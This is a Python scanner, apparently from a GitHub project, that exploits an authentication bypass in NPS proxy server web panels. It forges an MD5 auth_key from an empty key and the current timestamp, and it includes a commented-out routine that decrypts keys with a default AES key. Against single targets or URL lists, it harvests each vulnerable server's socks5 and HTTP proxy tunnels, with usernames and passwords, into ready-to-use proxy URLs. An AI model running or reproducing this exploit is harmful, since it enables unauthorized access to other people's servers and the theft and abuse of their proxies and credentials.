# -*- encoding:utf-8 -*-
"""
@使用说明:
python scan.py -u target_url -o txt -v
python scan.py -f file -o csv -p http://127.0.0.1:1080

@项目地址:
https://github.com/carr0t2/nps-auth-bypass
"""
import sys
from urllib.parse import urlparse
import argparse
import json
import time
import requests
import hashlib
from loguru import logger

# from Crypto.Cipher import AES
from urllib3.exceptions import NewConnectionError, ConnectTimeoutError, MaxRetryError

logger.remove()
logger.add(sys.stdout, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss.SSS}</green> | <level>{message}</level>", level="INFO", enqueue=True)

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def md5(s: str) -> str:
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


class NpsScaner:
    def __init__(self, args):
        self.url = args["url"]
        self.url_list = args["url_list"]
        self.format = args["format"]
        self.verbose = args["verbose"]
        self.proxies = {
            "http": args["proxy"],
            "https": args["proxy"]
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0",
            "Accept": "application/json, text/javascript, */*; q=0.01",
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            "Connection": "close"
        }
        # 存在漏洞的机器
        self.vuln_f = open(f"result_vuln_{int(time.time())}.txt", "a+", encoding="utf-8")

        # 输出处理
        if self.format == "mongo":
            import pymongo
            client = pymongo.MongoClient("mongodb://xxxxxx")
            self.table = client["xx"]["xx"]
        else:
            self.proxy_f = open(f"result_proxy_{int(time.time())}.txt", "a+", encoding="utf-8")

        # url和文件
        if self.url:
            url = self.url.strip("").rstrip("/")
            self.exp(url)
        elif self.url_list:
            with open(self.url_list, "r", encoding="utf-8") as f:
                targets = f.read().splitlines()
            for target in targets:
                self.exp(target.strip("").rstrip("/"))

    def exp(self, url):
        """

        :param url: 地址
        :return:
        """
        config_auth_key = ""
        status = {
            "url": url,
            "hacked": False,
            "socks5": 0,
            "http": 0,
            "error": ""
        }
        """
        # 为了简单起见 
        # 直接尝试配置文件中 auth_key 为空的情况
        # 不再尝试这段注释代码中的默认crypt_auth_key情况
        # 有想改的人可以自己改改
        try:
            burp0_url = url + "/auth/getauthkey"
            # 对应只修改了配置中auth_key 未修改auth_crypt_key的情况
            # 具体api内容见官方文档
            # https://github.com/ehang-io/nps/blob/c9a4d8285b30c3c140782fc660bfc3d6961262ed/docs/api.md#%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E7%AB%AFauthkey
            r = requests.get(burp0_url, proxies=self.proxies, headers=self.headers, timeout=2, verify=False, allow_redirects=False)
            crypt_auth_key = r.json()["crypt_auth_key"]
            defaul_aes_key = b"1234567812345678"
            b_key = bytes.fromhex(crypt_auth_key)
            enc = AES.new(key=defaul_aes_key, mode=AES.MODE_CBC, iv=defaul_aes_key)
            config_auth_key = enc.decrypt(b_key).decode()
            config_auth_key = config_auth_key[0:-ord(config_auth_key[-1])]  # 去填充
        except (ConnectionError, requests.exceptions.ReadTimeout):
            status["error"] = "连接失败"
        except (requests.exceptions.JSONDecodeError, simplejson.errors.JSONDecodeError):
            status["error"] = "页面错误"
        except KeyError:
            # 返回是json 但是可能修复了 关闭了api接口
            pass
        except UnicodeDecodeError:
            # aes解码失败 可能只配了auth_crypt_key 没配 auth_key
            # status["error"] = "非默认 auth_crypt_key"
            pass
        except Exception as e:
            import traceback
            print(traceback.print_exc())
            print(e)
        """

        try:
            now_timestamp = str(int(time.time()))
            auth_key = md5(config_auth_key + now_timestamp)
            burp0_url = url + f"/index/gettunnel?auth_key={auth_key}&timestamp={now_timestamp}"
            burp0_data = {"offset": "0", "limit": "100", "type": "socks5", "client_id": "", "search": ""}
            r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=5, verify=False, allow_redirects=False)
            if r.status_code == 302 and r.headers["Location"] == "/login/index":
                status["error"] = "不存在漏洞"
            elif r.status_code == 200 and r.headers["Content-Type"] == "application/json; charset=utf-8":
                if r.json()["rows"]:
                    self.out(r.json()["rows"], url)
                    status["socks5"] = len(r.json()["rows"])
                # 存在漏洞
                status["hacked"] = True
                self.vuln_f.write(url + "\n")
                burp0_data = {"offset": "0", "limit": "100", "type": "httpProxy", "client_id": "", "search": ""}
                r = requests.post(burp0_url, headers=self.headers, data=burp0_data, proxies=self.proxies, timeout=4, verify=False, allow_redirects=False)
                if r.json()["rows"]:
                    self.out(r.json()["rows"], url)
                    status["http"] = len(r.json()["rows"])
            else:
                status["error"] = "页面错误"
        except (ConnectionError, requests.exceptions.ReadTimeout, NewConnectionError, requests.exceptions.ConnectionError, ConnectTimeoutError, MaxRetryError):
            status["error"] = "连接失败"
        except requests.exceptions.JSONDecodeError:
            status["error"] = "页面错误"
        except KeyError:
            status["error"] = "json错误"
        except Exception as e:
            import traceback
            print(traceback.print_exc())
            print(e)
        logger.info(status)

    def out(self, j: json, url):
        """

        :param j: json数组
        :param url: web面板地址
        :return:
        """

        base_ip_port = urlparse(url).netloc
        base_ip = urlparse(url).netloc.split(":")[0]
        if not j:
            return
        elif self.format == "mongo":
            # 还要添加一下来源
            self.table.insert_many(j)
        else:
            for item in j:
                item["Mode"] = item["Mode"] if item["Mode"] == "socks5" else "http"
                tunnel = {
                    "from": base_ip_port,
                    "Mode": item["Mode"],
                    "User": item["Client"]["Cnf"]["U"],
                    "Pass": item["Client"]["Cnf"]["P"],
                    "ip": base_ip,
                    "Port": str(item["Port"]),
                    "proxy_url": f"""{item["Mode"]}://{base_ip}:{item["Port"]}"""
                }
                if tunnel["User"] or tunnel["Pass"]:
                    tunnel["proxy_url"] = f"""{item["Mode"]}://{tunnel["User"]}:{tunnel["Pass"]}@{base_ip}:{item["Port"]}"""

                if self.format == "json":
                    output = json.dumps(tunnel)
                elif self.format == "csv":
                    output = ",".join(list(tunnel.values()))
                else:
                    output = tunnel["proxy_url"]
                self.proxy_f.write(output + "\n")
                if self.verbose:
                    print(output)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="""Nps auth bypass Scanner
Author: Carrot2
Github: https://github.com/carr0t2/nps-auth-bypass
Example: python scan.py -u target_url -o txt -v
         python scan.py -l url_list -o csv -p http://127.0.0.1:1080""", formatter_class=argparse.RawTextHelpFormatter, )
    parser.add_argument("-u", "--url", type=str, help="Target URL")
    parser.add_argument("-l", "--url-list", type=str, help="Target URL list file")
    parser.add_argument("--format", type=str, default="txt", choices=["txt", "csv", "json", "mongodb"], help="Report format (Default: txt)")
    parser.add_argument("-p", "--proxy", type=str, help="Proxy URL, support HTTP and SOCKS proxies \n(Example: http://localhost:8080, socks5://localhost:8088)")
    parser.add_argument("-v", "--verbose", action='store_true', help="Execute in verbose mode")
    NpsScaner(vars(parser.parse_args()))

"""
json格式

[{
      "Id": 1,
      "Port": 1111,
      "ServerIp": "",
      "Mode": "socks5",
      "Status": false,
      "RunStatus": false,
      "Client": {
        "Cnf": {
          "U": "",
          "P": "",
          "Compress": true,
          "Crypt": true
        },
        "Id": 14,
        "VerifyKey": "duc8dig4ecjsv773",
        "Addr": "1.1.1.1",
        "Remark": "",
        "Status": true,
        "IsConnect": false,
        "RateLimit": 0,
        "Flow": {
          "ExportFlow": 97736114135,
          "InletFlow": 7397344435,
          "FlowLimit": 0
        },
        "Rate": {
          "NowRate": 0
        },
        "NoStore": false,
        "NoDisplay": false,
        "MaxConn": 0,
        "NowConn": 0,
        "WebUserName": "",
        "WebPassword": "",
        "ConfigConnAllow": false,
        "MaxTunnelNum": 0,
        "Version": "0.26.10"
      },
      "Ports": "",
      "Flow": {
        "ExportFlow": 97654717171,
        "InletFlow": 7394915792,
        "FlowLimit": 0
      },
      "Password": "",
      "Remark": "",
      "TargetAddr": "",
      "NoStore": false,
      "LocalPath": "",
      "StripPre": "",
      "Target": {
        "TargetStr": "",
        "TargetArr": null,
        "LocalProxy": false
      },
      "MultiAccount": null,
      "HealthCheckTimeout": 0,
      "HealthMaxFail": 0,
      "HealthCheckInterval": 0,
      "HealthNextTime": "0001-01-01T00:00:00Z",
      "HealthMap": null,
      "HttpHealthUrl": "",
      "HealthRemoveArr": null,
      "HealthCheckType": "",
      "HealthCheckTarget": ""
}]
"""
